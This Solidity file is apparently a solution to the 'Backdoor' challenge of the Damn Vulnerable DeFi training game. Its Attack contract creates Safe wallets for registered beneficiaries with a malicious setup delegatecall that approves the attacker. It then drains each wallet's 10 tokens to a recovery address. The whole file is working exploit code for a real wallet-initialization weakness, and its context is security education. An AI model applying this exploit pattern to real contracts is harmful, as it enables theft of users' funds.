// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Safe} from "@safe-global/safe-smart-account/contracts/Safe.sol";
import {SafeProxyFactory} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxyFactory.sol";
import {SafeProxy} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxy.sol";
import "safe-smart-account/contracts/proxies/IProxyCreationCallback.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {WalletRegistry} from "../../src/backdoor/WalletRegistry.sol";

contract Attack {
    address private immutable singletonCopy;
    address private immutable walletFactory;
    address private immutable walletRegistry;
    DamnValuableToken private immutable dvt;
    address recovery;

    constructor( 
        address _masterCopy,
        address _walletFactory,
        address _registry,
        address _token,
         address _recovery
    ) {
        singletonCopy = _masterCopy;
        walletFactory = _walletFactory;
        walletRegistry = _registry;
        recovery = _recovery;
        dvt = DamnValuableToken(_token);
    }

    function delegateApprove(address _spender) external {
        dvt.approve(_spender, 10 ether);
    }

    function attack(address[] memory _beneficiaries) external {
        for (uint i = 0; i < 4; i++) {
            address[] memory beneficiary = new address[](1);
            beneficiary[0] = _beneficiaries[i];

            bytes memory _initializer = abi.encodeWithSelector(    
                Safe.setup.selector,
                beneficiary,
                1,
                address(this),
                abi.encodeWithSignature("delegateApprove(address)", address(this)),
                address(0),
                0,
                0,
                0
            );

            // create new Proxies
            
        SafeProxy _newProxy = SafeProxyFactory(walletFactory).createProxyWithCallback(
            singletonCopy, 
            _initializer, 
            i, 
            IProxyCreationCallback(walletRegistry)
        );   
            
            dvt.transferFrom(address(_newProxy), recovery, 10 ether);

        }
    } 

}

